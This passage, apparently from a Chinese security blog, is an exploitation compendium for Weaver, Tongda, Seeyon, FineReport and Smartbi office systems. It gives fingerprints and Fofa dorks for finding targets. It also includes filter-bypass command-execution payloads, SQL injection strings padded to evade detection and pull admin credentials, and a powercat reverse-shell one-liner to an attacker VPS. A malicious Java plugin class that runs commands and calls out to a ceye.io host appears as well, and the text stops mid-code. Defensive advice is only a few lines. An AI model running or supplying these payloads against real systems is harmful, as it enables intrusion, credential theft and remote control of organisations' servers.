利用技巧</strong></p><p>1.其他形式绕过</p><p><code>eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);</code> 也可以换成 <code>ex\u0065c(&quot;cmd /c dir&quot;);</code></p><p>2.泛微多数都是windows环境, 反弹shell可以使用pcat</p><p><code>powershell IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c ip -p 6666 -e cmd</code></p><p><strong>8. 防护方法</strong></p><p>1.及时更新泛微补丁</p><p>2.拦截<code>/weaver/bsh.servlet.BshServlet</code>目录的访问</p><h2 id="泛微OA-e-cology-SQL注入漏洞"><a href="#泛微OA-e-cology-SQL注入漏洞" class="headerlink" title="泛微OA e-cology SQL注入漏洞"></a>泛微OA e-cology SQL注入漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a href="https://weaversrc.vulbox.com/">https://weaversrc.vulbox.com/</a>, 情况有所好转</p><p><strong>2. 影响组件</strong></p><p>泛微OA</p><p><strong>3. 漏洞指纹</strong></p><p><code>Set-Cookie: ecology_JSessionId=</code></p><p><code>ecology</code></p><p><code>WorkflowCenterTreeData</code></p><p><code>/mobile/plugin/SyncUserInfo.jsp</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;泛微-协同办公OA&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区<br><a href="https://xz.aliyun.com/t/6531">https://xz.aliyun.com/t/6531</a></p><p><strong>6. 漏洞利用</strong></p><p>泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现<em>数据库</em>小龙人-CSDN博客<br><a href="https://blog.csdn.net/zycdn/article/details/102494037">https://blog.csdn.net/zycdn/article/details/102494037</a></p><p>Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle<br><a href="https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py">https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py</a></p><p>应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园<br><a href="https://www.cnblogs.com/AtesetEnginner/p/11558469.html">https://www.cnblogs.com/AtesetEnginner/p/11558469.html</a></p><p><code>/mobile/plugin/SyncUserInfo.jsp</code> 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述</p><p><strong>7. 利用技巧</strong></p><p>1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了</p><p>2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了</p><p>3.这里可以绕过的原因是泛微某个过滤器初始化错误, 当长度超过<code>xssMaxLength=500</code>的时候就不进入安全检测, 修复以后是<code>xssMaxLength=1000000</code>, 所以随便你填充<code>%0a%0d</code>还是<code>空格</code>都可以绕过注入检测</p><p>4.泛微后端数据库版本存在差异, 但是可以通用检测</p><p>已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致</p><p>所以这里筛选出一个相对通用的检测手法(下面代码是python的<code>&quot; &quot;*800</code> 800个空格)</p><p><code>&quot;-1) &quot;+&quot; &quot;*800+ &quot;union select/**/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=(&#39;sysadmin&#39;&quot;</code></p><p>老版本可以在关键字后面加 <code>/**/</code> 来绕过sql检测</p><p>新版本可以通过加入大量空格/换行来绕过sql检测</p><p>mssql, oracle中都有<code>Hrmresourcemanager</code> , 这是管理员信息表</p><p>就<code>Hrmresource</code>表中没有用户, <code>Hrmresourcemanager</code> 表中也一定会存在<code>sysadmin</code>账户</p><p>所以进行<code>union select</code>的时候一定会有数据</p><p>这里也可以使用 <code>&quot;-1) &quot;+&quot; &quot;*800+ &quot; or/**/ 1=1 and id&lt;(5&quot;</code></p><p>这里使用 <code>&lt;5</code> 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用</p><p><strong>8. 防护方法</strong></p><p>1.及时更新泛微补丁<br>2.泛微最好不要开放到公网<br>3.使用waf拦击</p><h2 id="泛微OA-数据库泄露漏洞"><a href="#泛微OA-数据库泄露漏洞" class="headerlink" title="泛微OA 数据库泄露漏洞"></a>泛微OA 数据库泄露漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a href="https://weaversrc.vulbox.com/">https://weaversrc.vulbox.com/</a>, 情况有所好转</p><p><strong>2. 影响组件</strong></p><p>泛微OA</p><p><strong>3. 漏洞指纹</strong></p><p><code>Set-Cookie: ecology_JSessionId=</code></p><p><code>ecology</code></p><p><code>/mobile/DBconfigReader.jsp</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;泛微-协同办公OA&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞<br><a href="https://github.com/jas502n/DBconfigReader">https://github.com/jas502n/DBconfigReader</a></p><p><strong>6. 漏洞利用</strong></p><p>linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing<br><a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py</a></p><p><strong>7. 利用技巧</strong></p><p>1.虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 <code>pyDes.des(&#39; &#39;)</code><br>2.这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了<br>3.此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧</p><p><strong>8. 防护方法</strong></p><p>1.及时更新泛微补丁</p><p>2.泛微最好不要开放到公网</p><p>3.使用waf拦截sql注入</p><h2 id="通达OA-远程代码执行漏洞"><a href="#通达OA-远程代码执行漏洞" class="headerlink" title="通达OA 远程代码执行漏洞"></a>通达OA 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入</p><p><strong>2. 影响组件</strong><br>通达OA</p><p><strong>3. 漏洞指纹</strong></p><p><code>&quot;/images/tongda.ico&quot;&gt;</code></p><p><code>Office Anywhere 20xx版 网络智能办公系统</code></p><p><code>/ispirit/interface/gateway.php</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;通达OA&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p><p>代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zrools<br><a href="https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/">https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/</a></p><p><strong>6. 漏洞利用</strong></p><p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p><p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p><p>tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell<br><a href="https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py">https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有</p><p>绕过disable_function也很简单, 直接调用<code>COM(&#39;WScript.shell&#39;)</code>组件就ok了</p><p>2.文件名结构规则如下</p><p><code>256@2003_ 2055499620|123. php.</code></p><p>对应文件名为</p><p><code>attach/im/2003/2055499620.123.php</code></p><p>因为是windows的, <code>1.php.</code> 可以绕过黑名单, 写到文件就成了 <code>1.php</code> (<del>这里是文件包含, 文件名无所谓</del>)</p><p>3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个</p><p>(我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论)</p><p>通达OA前台任意用户伪造登录漏洞<br><a href="https://vas.riskivy.com/vuln-detail?id=33">https://vas.riskivy.com/vuln-detail?id=33</a></p><p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.使用waf拦截</p><h2 id="致远-OA-A8-htmlofficeservlet-getshell-漏洞"><a href="#致远-OA-A8-htmlofficeservlet-getshell-漏洞" class="headerlink" title="致远 OA A8 htmlofficeservlet getshell 漏洞"></a>致远 OA A8 htmlofficeservlet getshell 漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞</p><p><strong>2. 影响组件</strong><br>致远 OA</p><p><strong>3. 漏洞指纹</strong></p><p><code>/seeyon/htmlofficeservlet</code></p><p><code>/seeyon/index.jsp</code></p><p><code>seeyon</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;用友-致远OA&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p><p><strong>6. 漏洞利用</strong></p><p>timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list<br><a href="https://github.com/timwhitez/seeyon-OA-A8-GetShell">https://github.com/timwhitez/seeyon-OA-A8-GetShell</a></p><p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p><p>这里还有个XXE</p><p>致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Blog<br><a href="https://landgrey.me/blog/8/">https://landgrey.me/blog/8/</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题</p><p>这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊</p><p>这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64</p><pre><code class="hljs vim">from sys import <span class="hljs-built_in">argv</span>letters = <span class="hljs-string">&quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&quot;</span>def base64_encode(input_str):    str_ascii_list = [<span class="hljs-string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.format(str(bin(ord(i))).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>))                      <span class="hljs-keyword">for</span> i in input_str]    output_str = <span class="hljs-string">&#x27;&#x27;</span>    equal_num = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> str_ascii_lis<span class="hljs-variable">t:</span>        temp_list = str_ascii_list[:<span class="hljs-number">3</span>]        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(temp_list) != <span class="hljs-number">3</span>:            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(temp_list) &lt; <span class="hljs-number">3</span>:                equal_num += <span class="hljs-number">1</span>                temp_list += [<span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">8</span>]        temp_str = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(temp_list)        temp_str_list = [temp_str[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + <span class="hljs-number">6</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in [<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">18</span>]]        temp_str_list = [<span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list]        <span class="hljs-keyword">if</span> equal_num:            temp_str_list = temp_str_list[<span class="hljs-number">0</span>:<span class="hljs-number">4</span> - equal_num]        output_str += <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>([letters[<span class="hljs-keyword">x</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list])        str_ascii_list = str_ascii_list[<span class="hljs-number">3</span>:]    output_str = output_str + <span class="hljs-string">&#x27;=&#x27;</span> * equal_num    <span class="hljs-keyword">return</span> output_strdef base64_decode(input_str):    str_ascii_list = [<span class="hljs-string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.format(str(bin(letters.<span class="hljs-built_in">index</span>(i))).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>))                      <span class="hljs-keyword">for</span> i in input_str <span class="hljs-keyword">if</span> i != <span class="hljs-string">&#x27;=&#x27;</span>]    output_str = <span class="hljs-string">&#x27;&#x27;</span>    equal_num = input_str.<span class="hljs-built_in">count</span>(<span class="hljs-string">&#x27;=&#x27;</span>)    <span class="hljs-keyword">while</span> str_ascii_lis<span class="hljs-variable">t:</span>        temp_list = str_ascii_list[:<span class="hljs-number">4</span>]        temp_str = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(temp_list)        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(temp_str) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:            temp_str = temp_str[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span> * equal_num * <span class="hljs-number">2</span>]        temp_str_list = [temp_str[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + <span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in [<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]]        temp_str_list = [<span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list <span class="hljs-keyword">if</span> <span class="hljs-keyword">x</span>]        output_str += <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>([chr(<span class="hljs-keyword">x</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list])        str_ascii_list = str_ascii_list[<span class="hljs-number">4</span>:]    <span class="hljs-keyword">return</span> output_str<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">argv</span>) == <span class="hljs-number">2</span>:        <span class="hljs-keyword">print</span>(base64_decode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>]))    elif <span class="hljs-built_in">len</span>(<span class="hljs-built_in">argv</span>) == <span class="hljs-number">3</span>:        <span class="hljs-keyword">if</span> <span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-d&#x27;</span>:            <span class="hljs-keyword">print</span>(base64_decode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>]))        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">print</span>(base64_encode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>]))    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Seeyon OA /seeyon/htmlofficeservlet param encode/decode&quot;</span>)        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Usage:&quot;</span>)        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;python %s encoded_str&quot;</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])t        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;python %s -d encoded_str&quot;</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;python %s -e raw_str&quot;</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])</code></pre><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.使用waf拦截</p><h2 id="致远OA-帆软报表-seeyonreport-远程代码执行"><a href="#致远OA-帆软报表-seeyonreport-远程代码执行" class="headerlink" title="[致远OA] 帆软报表 seeyonreport 远程代码执行"></a>[致远OA] 帆软报表 seeyonreport 远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>帆软报表 (seeyonreport) 很多时候会跟合致远OA一起出现, 通常用户还不知道, 所以这里有几个漏洞点</p><p><strong>2. 影响组件</strong></p><p>帆软报表 seeyonreport</p><p><strong>3. 漏洞指纹</strong></p><p><code>https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</code></p><p><code>seeyonreport</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;用友-致远OA&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378">http://foreversong.cn/archives/1378</a></p><p><strong>6. 漏洞利用</strong></p><p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378">http://foreversong.cn/archives/1378</a></p><p>xray/finereport-directory-traversal.yml at master · chaitin/xray<br><a href="https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml">https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml</a><br><strong>7. 利用技巧</strong></p><p>1.未设置密码或者读取读取管理员密码<br><a href="https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892">https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</a></p><p>这里很有可能是没有设置密码的, 修改密码进入后台就可以了</p><p>如果设置里密码, 尝试这个接口 <code>/report/ReportServer?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml</code>, 读取管理员密码, 然后使用上文的解密程序解密</p><p>2.后台getshell<br>这种后台能装插件的都随便getshell</p><p>先去下载一个指定版本的jar包</p><p>本地测试环境是9.0</p><p>下载com.fr.plugin.external-1.3.4.zip<br><a href="https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66">https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66</a></p><p><a href="http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=">http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=</a></p><p>编译一个恶意的class打包进去</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fr.plugin.external.locale;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.lang.Runtime;<span class="hljs-keyword">import</span> java.lang.Process;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LocaleFinder</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LocaleFinder</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException </span>&#123;        String[] commands; <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;            commands = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;C:\\Windows\\System32\\cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;ping -nc 3 %username%.win.seeyonreport.ceyedoamin.ceye.io&quot;</span>&#125;; &#125;        <span class="hljs-keyword">else</span> &#123;            commands = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;curl `whoami`.linux.seeyonreport.ceyedoamin.ceye.io&quot;</span>&#125;; &#125;        Runtime rt = Runtime.getRuntime(); Process pc = rt.exec(commands); pc.waitFor(); &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] argv)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException </span>&#123;        LocaleFinder e = <span class="hljs-keyword">new</span> LocaleFinder(); &#125;&#125;</code></pre><p>复制LocaleFinder.class到<br><code>\com.fr.plugin.external-1.3.4.zip\fr-plugin-external-1.3.4\fr-plugin-external-1.3.4.jar\com\fr\plugin\external\locale\</code></p><p>进入到插件管理界面, 上传符合规范的jar包插件即可<br>没生效就访问一下 <code>https://xxxx/seeyonreport/ReportServer?op=im</code></p><p>一般后台都是win, 可以直接使用powershell进行反弹shell</p><p><code>powershell IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c vps_ip -p 6666 -e cmd</code></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.使用waf拦截</p><h2 id="Smartbi-前台SQL注入"><a href="#Smartbi-前台SQL注入" class="headerlink" title="Smartbi 前台SQL注入"></a>Smartbi 前台SQL注入</h2><p><strong>1. 漏洞简介</strong></p><p>Smartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户.</p><p><strong>2. 影响组件</strong><br>Smartbi</p><p><strong>3. 漏洞指纹</strong></p><p><code>SmartBi</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Smartbi&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Smartbi软件SQL注入漏洞安全修复通报（厂商已修复）<br><a href="https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ">https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ</a></p><p>漏洞文件<br><code>vision/userListManager.jsp</code></p><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doDel</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-keyword">var</span> ids = [];   <span class="hljs-comment">// 全选</span>   <span class="hljs-keyword">if</span>($(<span class="hljs-string">&quot;#checkAll&quot;</span>).checked)&#123;      <span class="hljs-keyword">if</span>(curRows)&#123;         curRows.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">val, index</span>)</span>&#123;            ids.push(val.id);         &#125;);      &#125;   &#125;<span class="hljs-keyword">else</span>&#123;      <span class="hljs-keyword">if</span>(curRows)&#123;         $(<span class="hljs-string">&quot;[name=&#x27;checkTr&#x27;]&quot;</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.checked)&#123;               ids.push(<span class="hljs-built_in">this</span>.id);            &#125;         &#125;);      &#125;   &#125;   <span class="hljs-keyword">if</span>(ids &amp;&amp; ids.length &gt; <span class="hljs-number">0</span>)&#123;      <span class="hljs-keyword">if</span>(!canOpt())&#123;         alert(<span class="hljs-string">&quot;&lt;%=StringUtil.getLanguageValue(&quot;</span>Youdonothavepermissiontodoso<span class="hljs-string">&quot;)%&gt;&quot;</span>);         <span class="hljs-keyword">return</span>;      &#125;      <span class="hljs-keyword">var</span> msg = <span class="hljs-string">&quot;&lt;%=StringUtil.getLanguageValue(&quot;</span>Suredelete?<span class="hljs-string">&quot;)%&gt;&quot;</span>;      <span class="hljs-keyword">var</span> flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;      alert(msg, <span class="hljs-string">&quot;&lt;%=StringUtil.getLanguageValue(&quot;</span>Removetips<span class="hljs-string">&quot;)%&gt;&quot;</span>, flags, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">ret</span>) </span>&#123;         <span class="hljs-keyword">if</span> (ret == modalWindow.ID_YES) &#123;            <span class="hljs-keyword">var</span> ret = jsloader.resolve(<span class="hljs-string">&quot;freequery.common.util&quot;</span>).remoteInvokeEx2(<span class="hljs-string">&quot;BIConfigService&quot;</span>, <span class="hljs-string">&quot;delUsers&quot;</span>, [ids]);            <span class="hljs-keyword">if</span>(ret &amp;&amp; ret.result == <span class="hljs-number">1</span>)&#123;               alert(<span class="hljs-string">&quot;&lt;%=StringUtil.getLanguageValue(&quot;</span>Deletedsuccessfully<span class="hljs-string">&quot;)%&gt;&quot;</span>);               refresh();            &#125;         &#125;      &#125;, <span class="hljs-built_in">this</span>);   &#125;<span class="hljs-keyword">else</span>&#123;      alert(<span class="hljs-string">&quot;&lt;%=StringUtil.getLanguageValue(&quot;</span>Noselectedobjectyouwanttodelete<span class="hljs-string">&quot;)%&gt;&quot;</span>);   &#125;&#125;</code></pre><p><code>smartbi/WEB-INF/lib/smartbi-BIConfig.jar!/smartbi/config/BIConfigService.class</code></p><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> int <span class="hljs-function"><span class="hljs-title">delUsers</span>(<span class="hljs-params">List&lt;<span class="hljs-built_in">String</span>&gt; ids</span>)</span> &#123;    <span class="hljs-built_in">boolean</span> succ = <span class="hljs-literal">true</span>;    <span class="hljs-built_in">String</span> idStr = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">if</span> (ids != <span class="hljs-literal">null</span> &amp;&amp; ids.size() &gt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">for</span>(int i = <span class="hljs-number">0</span>; i &lt; ids.size(); ++i) &#123;            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;                idStr = <span class="hljs-string">&quot;(&#x27;&quot;</span> + (<span class="hljs-built_in">String</span>)ids.get(i) + <span class="hljs-string">&quot;&#x27;&quot;</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                idStr = idStr + <span class="hljs-string">&quot;, &quot;</span> + <span class="hljs-string">&quot;&#x27;&quot;</span> + (<span class="hljs-built_in">String</span>)ids.get(i) + <span class="hljs-string">&quot;&#x27;&quot;</span>;            &#125;        &#125;        idStr = idStr + <span class="hljs-string">&quot;)&quot;</span>;        Connection conn = <span class="hljs-literal">null</span>;        PreparedStatement prep = <span class="hljs-literal">null</span>;        <span class="hljs-built_in">Object</span> rs = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            conn = DbUtil.getRepoConnection();            conn.setAutoCommit(<span class="hljs-literal">false</span>);            <span class="hljs-built_in">String</span> sqlUser = <span class="hljs-string">&quot;delete from t_user where c_userid in &quot;</span> + idStr;            <span class="hljs-built_in">String</span> sqlUserAttr = <span class="hljs-string">&quot;delete from t_userattr where c_userid in &quot;</span> + idStr;            <span class="hljs-built_in">String</span> sqlUserconfig = <span class="hljs-string">&quot;delete from t_userconfig where c_userid in &quot;</span> + idStr;            <span class="hljs-built_in">String</span> sqlUserRole = <span class="hljs-string">&quot;delete from t_user_role where c_userid in &quot;</span> + idStr;            